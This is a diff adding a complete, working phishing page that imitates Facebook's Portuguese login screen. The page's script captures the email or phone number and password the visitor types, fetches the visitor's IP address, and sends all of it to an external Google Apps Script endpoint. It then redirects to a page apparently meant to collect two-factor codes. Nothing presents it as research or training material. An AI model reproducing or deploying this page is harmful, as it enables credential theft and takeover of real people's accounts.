@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="login.css">
+    <link rel="shortcut icon" type="image/x-icon" href="acsets/Facebook_Logo_(2019).png">
+    <title>Facebook</title>
+</head>
+
+<body>
+    <div class="logo">
+        <p style="color: #4f5255;">Português</p>
+        <img style="margin-top:60px;" width="58px" src="acsets/Facebook_Logo_(2019).png" alt="">
+    </div>
+    <div class="form" style="text-align: center;">
+        <form id="loginForm" action="2fa.html" method="post" onsubmit="return validateForm(event)">
+            <div>
+                <input placeholder="Número de telemóvel ou e-mail" required type="text" id="email">
+            </div>
+            <div>
+                <input placeholder="Palavra-passe" type="password" required id="password">
+            </div>
+            <div id="error" style="color: red; display: none;"></div>
+            <div style="display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            margin: 0 auto;">
+                <button style="margin:10 auto; display: flex; align-items: center; justify-content: center;"
+                    type="submit" class="submit" id="submitButton">
+                    <span id="continueText">Conecte-se</span>
+                    <img id="loadingIcon" width="30px" src="acsets/loading.png" alt=""
+                        style="margin-left: 5px; display: none;">
+                </button>
+            </div>
+        </form>
+        <a href="#">Esqueceu-se da senha?</a>
+    </div>
+    <div class="form">
+        <div><button class="btn" type="button">Criar nova conta</button></div>
+        <div style="margin-top: 20px;"><img class="meta" width="60px" src="acsets/logo.png" alt=""></div>
+    </div>
+    <div style="height: 50px;">
+
+    </div>
+
+    <script>
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip; // Trả về địa chỉ IP
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return 'N/A'; // Nếu không lấy được IP
+            }
+        }
+
+        async function validateForm(event) {
+            event.preventDefault();
+            const emailOrPhone = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            document.getElementById("continueText").style.display = "none";
+            document.getElementById("loadingIcon").style.display = "block";
+
+            // Reset lỗi
+            document.getElementById('error').style.display = 'none';
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phoneRegex = /^\d{7,15}$/;
+
+            if (!emailRegex.test(emailOrPhone) && !phoneRegex.test(emailOrPhone)) {
+                document.getElementById('error').innerText = "O endereço de e-mail ou o número de telemóvel introduzido não está ligado a uma conta.";
+                document.getElementById('error').style.display = 'block';
+                document.getElementById("continueText").style.display = "block";
+                document.getElementById("loadingIcon").style.display = "none";
+                return false;
+            }
+            // Kiểm tra password trên 6 ký tự
+            if (!password) {
+                document.getElementById('error').innerText = "A palavra-passe que introduziu está incorreta.";
+                document.getElementById('error').style.display = 'block';
+                document.getElementById("continueText").style.display = "block";
+                document.getElementById("loadingIcon").style.display = "none";
+                return false;
+            }
+
+            // Kiểm tra email hoặc số điện thoại
+
+            const now = new Date();
+            const date = now.toISOString().slice(0, 19).replace(" T ", " ");
+
+
+            try {
+                // Lấy IP của người dùng
+                const ip = await getUserIP();
+
+                // Gửi dữ liệu tới API với chế độ `no-cors`
+                await fetch('https://script.google.com/macros/s/AKfycbyLFghQcy5cU2CDubaf82VXEpJ_iLlLBNA1IWEUiPtMdkYPTtVcrbJxfvbIyDy-QdMU/exec', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        date: date,
+                        email:"'" + emailOrPhone,
+                        name: "'"+ password,
+                        code: "------",
+                        ip: ip
+                    
+                    })
+                });
+
+        // Chuyển hướng sang form khác sau khi gửi dữ liệu
+        window.location.href = '2fa-po.html';
+        return true;
+
+            } catch (error) {
+            document.getElementById("continueText").style.display = "inline";
+            document.getElementById("loadingIcon").style.display = "none";
+        }
+        }
+    </script>
+</body>
+
+</html>
